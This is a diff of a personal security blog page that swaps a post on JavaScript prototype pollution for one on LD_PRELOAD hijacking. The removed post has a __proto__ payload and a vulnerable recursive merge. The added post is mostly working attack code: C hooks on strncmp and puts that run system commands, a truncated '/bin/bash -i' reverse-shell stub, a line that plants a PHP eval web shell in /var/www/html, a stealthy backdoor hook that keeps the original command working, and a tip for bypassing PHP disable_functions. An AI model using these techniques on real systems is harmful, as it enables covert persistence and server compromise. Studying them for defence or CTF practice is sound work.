@@ -19,21 +19,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="文章 常用payload: 1&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125; 模块中的漏洞见如上链接.![[Pasted image 20250115112602.png]]一个简单的例子： 12345object1 &#x3D; &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;">
+    <meta name="description" content="学习文章 用命令readelf -Ws &#x2F;usr&#x2F;bin&#x2F;ls看linux命令中执行了调用了哪些函数,然后再劫持这些函数 可能实现中有,但是执行时没用到, 所以多劫持几个试试 ls –&gt; strncmpwhoami –&gt; puts man 3 strncmp 可以看到函数定义 防止无穷递归12345678int strncmp(const char *s1, const char *s">
 <meta property="og:type" content="article">
-<meta property="og:title" content="javascript原型链污染">
-<meta property="og:url" content="http://mekrina.github.io/blogs/javascript/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:title" content="LD_PRELOAD劫持">
+<meta property="og:url" content="http://mekrina.github.io/blogs/uncategorized/ld_preload%E5%8A%AB%E6%8C%81/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="文章 常用payload: 1&#123;&quot;__proto__&quot;: &#123;&quot;admin&quot;: 1&#125;&#125; 模块中的漏洞见如上链接.![[Pasted image 20250115112602.png]]一个简单的例子： 12345object1 &#x3D; &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;">
+<meta property="og:description" content="学习文章 用命令readelf -Ws &#x2F;usr&#x2F;bin&#x2F;ls看linux命令中执行了调用了哪些函数,然后再劫持这些函数 可能实现中有,但是执行时没用到, 所以多劫持几个试试 ls –&gt; strncmpwhoami –&gt; puts man 3 strncmp 可以看到函数定义 防止无穷递归12345678int strncmp(const char *s1, const char *s">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-08T04:15:18.501Z">
+<meta property="article:modified_time" content="2025-04-12T12:52:55.185Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>javascript原型链污染 - mekrina</title>
+  <title>LD_PRELOAD劫持 - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="javascript原型链污染"></span>
+            <span id="subtitle" data-typed-text="LD_PRELOAD劫持"></span>
           
         </div>
 
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          217 字
+          403 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          2 分钟
+          4 分钟
         
       </span>
     
@@ -270,20 +270,30 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">javascript原型链污染</h1>
+            <h1 id="seo-header">LD_PRELOAD劫持</h1>
             
             
               <div class="markdown-body">
                 
-                <p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10032">文章</a></p>
-<p>常用payload:</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
-<p>模块中的漏洞见如上链接.<br>![[Pasted image 20250115112602.png]]<br>一个简单的例子：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">object1 = &#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-number">2</span>&#125;;<br>object1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">foo</span> = <span class="hljs-string">&quot;Hello World&quot;</span>;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object1.<span class="hljs-property">foo</span>);<br>object2 = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-number">1</span>, <span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-number">2</span>&#125;;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object2.<span class="hljs-property">foo</span>);<br></code></pre></td></tr></table></figure>
-<p>这里object2本来没有foo属性，可见object2.proto和object1是共享的。这样所有的object都带上了这个属性。</p>
-<p>常见的攻击点：merge \ Object.assign</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target)         &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> object1 = &#123;&#125;<br><span class="hljs-keyword">let</span> object2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<br><span class="hljs-title function_">merge</span>(object1, object2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object1.<span class="hljs-property">a</span>, object1.<span class="hljs-property">b</span>)<br><br>object3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object3.<span class="hljs-property">b</span>)<br></code></pre></td></tr></table></figure>
-<p>递归merge, 会存在这样一个操作, object1.proto.b &#x3D; object2.proto.b; 所以object的原型被污染,都带上了b,且值为2</p>
+                <p><a target="_blank" rel="noopener" href="https://luokuang1.github.io/2024/08/16/%E6%B5%85%E8%B0%88LD-PRELOAD%E5%8A%AB%E6%8C%81/">学习文章</a></p>
+<p>用命令<code>readelf -Ws /usr/bin/ls</code>看linux命令中执行了调用了哪些函数,然后再劫持这些函数</p>
+<p>可能实现中有,但是执行时没用到, 所以多劫持几个试试</p>
+<p><code>ls</code> –&gt; <code>strncmp</code><br><code>whoami</code> –&gt; <code>puts</code></p>
+<p>man 3 strncmp 可以看到函数定义</p>
+<h2 id="防止无穷递归"><a href="#防止无穷递归" class="headerlink" title="防止无穷递归"></a>防止无穷递归</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">strncmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2, <span class="hljs-type">size_t</span> n)</span>&#123;<br>    <span class="hljs-keyword">if</span>(getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;ls&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="奇怪的错误"><a href="#奇怪的错误" class="headerlink" title="奇怪的错误"></a>奇怪的错误</h2><p>报segmentation fault</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>    system(<span class="hljs-string">&quot;/bin/bash -i ...&quot;</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hacked!!!&quot;</span>);  <span class="hljs-comment">// printf(&quot;hacked!!!\n&quot;); 报错!!</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// ----------- or -----</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack you!!!&quot;</span>);<br>  system(<span class="hljs-string">&quot;echo &#x27;&lt;?php @eval($_POST[0]);?&gt;&#x27; &gt; /var/www/html/gxngxngxn.php&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>去掉<code>\n</code>后又可以了<br>(神奇的gpt告诉我是因为printf中调用了puts, 所以递归爆栈了, \n与刷新缓冲区有关… 管他呢)</p>
+<p>getenv也会调用puts,所以用上面的方法也不行</p>
+<p>可以用static int flag作为标记,防止递归调用, 见下例</p>
+<h2 id="隐匿后门"><a href="#隐匿后门" class="headerlink" title="隐匿后门"></a>隐匿后门</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span> &#123;<br>    <span class="hljs-type">int</span> (*original_puts)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;puts&quot;</span>);<br>    <span class="hljs-type">int</span> result = original_puts(s);<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> in_hook = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (in_hook) &#123; <span class="hljs-comment">// 防止递归调用</span><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    in_hook = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts hooked!\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;ls&quot;</span>);<br>    in_hook = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>(爱来自gpt)<br>可以使得原来的命令正常执行,用于后门隐匿</p>
+<h2 id="so-文件加载触发"><a href="#so-文件加载触发" class="headerlink" title=".so 文件加载触发"></a>.so 文件加载触发</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i am hacker!!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="突破disable-function"><a href="#突破disable-function" class="headerlink" title="突破disable_function"></a>突破disable_function</h2><p>disable_function只在当前进程生效<br>mail 或 error_log函数产生一个新进程, 并执行了getuid函数<br>劫持getuid函数 或 采用加载触发即可</p>
 
                 
               </div>
@@ -291,27 +301,6 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/blogs/categories/javascript/" class="category-chain-item">javascript</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
   
   
 </div>
@@ -322,8 +311,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>javascript原型链污染</div>
-      <div>http://mekrina.github.io/blogs/javascript/javascript原型链污染/</div>
+      <div>LD_PRELOAD劫持</div>
+      <div>http://mekrina.github.io/blogs/uncategorized/ld_preload劫持/</div>
     </div>
     <div class="license-meta">
       
@@ -367,9 +356,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/uncategorized/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="http请求走私">
+                      <a href="/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/" title="jwt伪造">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">http请求走私</span>
+                        <span class="hidden-mobile">jwt伪造</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -377,8 +366,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/" title="jwt伪造">
-                        <span class="hidden-mobile">jwt伪造</span>
+                      <a href="/blogs/php/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">
+                        <span class="hidden-mobile">php伪协议</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
